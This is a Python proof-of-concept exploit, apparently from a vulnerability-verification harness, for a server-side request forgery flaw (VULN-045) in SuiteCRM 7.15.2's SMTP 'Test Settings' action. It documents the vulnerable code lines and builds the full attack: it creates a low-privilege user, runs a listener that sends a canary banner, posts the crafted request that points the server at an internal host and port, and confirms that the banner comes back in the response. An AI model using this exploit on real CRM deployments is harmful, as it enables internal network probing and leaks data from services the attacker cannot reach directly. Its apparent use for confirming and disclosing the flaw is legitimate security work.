#!/usr/bin/env python3
"""
VULN-045 -- SMTP "Test Settings" body-returning SSRF (arbitrary host:port
+ banner/transcript exfiltration)

Software:    SuiteCRM
Repository:  https://github.com/SuiteCRM/SuiteCRM
Version:     7.15.2 (targets/SuiteCRM/suitecrm_version.php), commit
             62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink:        modules/Emails/Email.php:822-825 (sendEmailTest) -- assigns the
             request-controlled $mailserver_url/$port straight to
             SugarPHPMailer's Host/Port with no validate_external_host()
             call and no port allow-list; on failure the FULL SMTP
             transcript (mail->fullSmtpLog) is JSON-encoded and returned to
             the client (modules/Emails/Email.php:859).
Entry point: modules/Emails/EmailUIAjax.php:1354 case "testOutbound" --
             reachable by ANY authenticated (non-admin) user via
             index.php?module=Emails&action=EmailUIAjax&emailUIAction=testOutbound.

What this script does
----------------------
1. Creates a fresh, non-admin SuiteCRM user (proves PR:L, not admin-only).
2. Starts a plain TCP listener on 0.0.0.0:33119 (host) that, on accept,
   sends a single-line, ASCII "banner" containing a random canary string
   -- exactly what a server-speaks-first service (SMTP/FTP/etc.) would.
   The app container reaches this listener at 172.18.0.1:33119 (the
   docker bridge gateway -- see TARGET_FACTS.md "Network facts for SSRF").
3. As the low-priv user, POSTs the testOutbound AJAX action pointing
   mail_smtpserver/mail_smtpport at that internal-only listener.
4. Asserts the canary banner string is reflected verbatim inside the JSON
   response's "fullSmtpLog" field -- i.e. the *content* the attacker's own
   OOB listener sent to the *server* comes back to the *attacker* over the
   unrelated HTTP channel. That is the concrete "SSRF with response
   disclosure" effect (not just a bare HTTP 200).

Request-shape note (recorded for the record): naive requests without an
`X-Requested-With: XMLHttpRequest` header still exercise the vulnerable
sendEmailTest() sink (confirmed via suitecrm.log + the ~10s SMTP-connect
timeout), but SuiteCRM's ajaxUI view-option resolution
(include/MVC/View/SugarView.php:1259 _getOption(), the 'show_all' key
short-circuit) can swallow the JSON body in some flag combinations, and a
MySQL target's *binary* handshake breaks json_encode() (invalid UTF-8) so
the field truncates to "" -- both are cosmetic/encoding side-effects of
the target chosen, not a mitigation, and neither happens with the
X-Requested-With header + a plain-ASCII OOB banner used below.
"""
import os
import sys
import socket
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict, new_session,
                      admin_session, create_user, web_login, BROWSER_UA)

VULN_ID = "VULN-045"
OOB_HOST = os.environ.get("OOB_HOST", "172.18.0.1")   # how the APP reaches us
OOB_BIND = os.environ.get("OOB_BIND", "0.0.0.0")       # how WE bind
OOB_PORT = int(os.environ.get("OOB_PORT", "33119"))

HERE = os.path.dirname(os.path.abspath(__file__))
EVIDENCE = os.path.join(HERE, "evidence")
os.makedirs(EVIDENCE, exist_ok=True)


class SmtpBannerListener:
    """Minimal raw-TCP 'server-speaks-first' listener: sends one banner
    line on accept, logs whatever the client then sends, closes."""

    def __init__(self, bind_host, port, banner_line):
        self.bind_host = bind_host
        self.port = port
        self.banner_line = banner_line
        self.hits = []
        self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._srv.bind((bind_host, port))
        self._srv.listen(5)
        self._srv.settimeout(0.5)
        self._stop = False
        self._thread = threading.Thread(target=self._run, daemon=True)

    def start(self):
        self._thread.start()

    def stop(self):
        self._stop = True
        self._thread.join(timeout=5)
        self._srv.close()

    def _run(self):
        while not self._stop:
            try:
                conn, addr = self._srv.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                conn.settimeout(5)
                conn.sendall(self.banner_line.encode("ascii"))
                try:
                    data = conn.recv(4096)
                except socket.timeout:
                    data = b""
                self.hits.append({"peer": f"{addr[0]}:{addr[1]}", "recv": data})
                log("INFO", f"OOB listener: accepted connection from {addr[0]}:{addr[1]}, "
                             f"sent banner, client then sent {len(data)} bytes: {data[:120]!r}")
            finally:
                conn.close()


def main():
    banner(VULN_ID, 'SMTP "Test Settings" full-read SSRF (testOutbound -> fullSmtpLog)')

    canary = rand("smtp")
    banner_line = f"220 BANNER-LEAK-{canary} ESMTP ready\r\n"
    log("SETUP", f"canary banner line: {banner_line!r}")

    listener = SmtpBannerListener(OOB_BIND, OOB_PORT, banner_line)
    listener.start()
    log("SETUP", f"OOB TCP listener bound on {OOB_BIND}:{OOB_PORT} "
                  f"(app container reaches it at {OOB_HOST}:{OOB_PORT})")

    log("STEP", "admin web login")
    admin_s = admin_session()
    log("OK", "admin session established")

    log("STEP", "provisioning a fresh NON-ADMIN user (proves PR:L)")
    user = create_user(admin_s, rand("Pw") + "!2026x")
    log("OK", f"created user {user['user_name']} (id={user['id']})")

    log("STEP", f"web login as low-priv user {user['user_name']}")
    victim_s = web_login(user["user_name"], user["password"])
    log("OK", "low-priv session established")

    from_addr = f"{rand('a')}@b.example"
    data = {
        "module": "Emails",
        "action": "EmailUIAjax",
        "emailUIAction": "testOutbound",
        "mail_smtpserver": OOB_HOST,
        "mail_smtpport": str(OOB_PORT),
        "mail_smtpssl": "0",
        "mail_smtpauth_req": "0",
        "mail_smtpuser": "",
        "outboundtest_from_address": from_addr,
    }
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Referer": f"{BASE_URL}/index.php?module=Emails&action=EmailUIAjax",
        "User-Agent": BROWSER_UA,
    }

    log("STEP", f"POST testOutbound -> mail_smtpserver={OOB_HOST} mail_smtpport={OOB_PORT} "
                f"(internal-only SSRF target, only reachable from the app's network position)")

    # Build the raw request.http record before firing (values are already known).
    req_lines = [
        f"POST /index.php HTTP/1.1",
        f"Host: localhost:33116",
        f"Cookie: PHPSESSID=<low-priv-session>",
        f"User-Agent: {BROWSER_UA}",
        f"X-Requested-With: XMLHttpRequest",
        f"Referer: {BASE_URL}/index.php?module=Emails&action=EmailUIAjax",
        f"Content-Type: application/x-www-form-urlencoded",
        "",
        "&".join(f"{k}={v}" for k, v in data.items()),
    ]
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("\n".join(req_lines) + "\n")

    t0 = time.time()
    r = victim_s.post(f"{BASE_URL}/index.php", data=data, headers=headers, timeout=60)
    elapsed = time.time() - t0
    log("INFO", f"HTTP {r.status_code} in {elapsed:.1f}s, body length={len(r.text)}")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP {r.status_code}\n")
        for k, v in r.headers.items():
            f.write(f"{k}: {v}\n")
        f.write("\n")
        f.write(r.text)

    listener.stop()
    with open(os.path.join(EVIDENCE, "oob_listener.log"), "w") as f:
        f.write(f"listener bound {OOB_BIND}:{OOB_PORT}, banner={banner_line!r}\n")
        for h in listener.hits:
            f.write(f"HIT from {h['peer']}: client sent {h['recv']!r}\n")
        if not listener.hits:
            f.write("(no connections received)\n")

    # SuiteCRM's classic-view ajaxUI rendering can append trailing page
    # fragments after the JSON payload EmailUIAjax.php echoes (a legacy
    # output-buffering quirk of ViewClassic, unrelated to this bug), so a
    # strict r.json() sometimes sees "Extra data" after the JSON object.
    # Pull the JSON object out with a bracket-matching scan instead, and
    # fall back to a raw substring search either way -- the decisive proof
    # is the canary string appearing in the HTTP response body at all.
    import re
    body = {}
    m = re.search(r"\{.*\"fullSmtpLog\".*\}", r.text)
    if m:
        try:
            import json as _json
            body = _json.loads(m.group(0))
        except Exception as e:  # noqa: BLE001
            log("INFO", f"non-fatal: could not strict-parse extracted JSON object: {e}")

    full_log = body.get("fullSmtpLog", "") if isinstance(body, dict) else ""
    log("INFO", f"fullSmtpLog (first 400 chars): {full_log[:400]!r}")

    oob_hit = len(listener.hits) > 0
    canary_in_response = f"BANNER-LEAK-{canary}" in r.text

    if oob_hit:
        log("PROOF", f"OOB listener recorded a connection from the SuiteCRM app "
                      f"(peer {listener.hits[0]['peer']}) -- the server made an outbound "
                      f"TCP connection to an address the HTTP attacker cannot reach directly.")
    if canary_in_response:
        log("PROOF", f"HTTP response fullSmtpLog contains our planted banner "
                      f"'BANNER-LEAK-{canary}' -- full round-trip disclosure of bytes read "
                      f"from the internal target, back to the unauthenticated network position "
                      f"of the HTTP client.")

    if oob_hit and canary_in_response:
        verdict(VULN_ID, "CONFIRMED",
                f"low-priv user {user['user_name']} forced an outbound SMTP-protocol "
                f"connection to {OOB_HOST}:{OOB_PORT}; response echoed banner "
                f"BANNER-LEAK-{canary}")
        sys.exit(0)
    else:
        verdict(VULN_ID, "FAILED",
                f"oob_hit={oob_hit} canary_in_response={canary_in_response}")
        sys.exit(1)


if __name__ == "__main__":
    main()
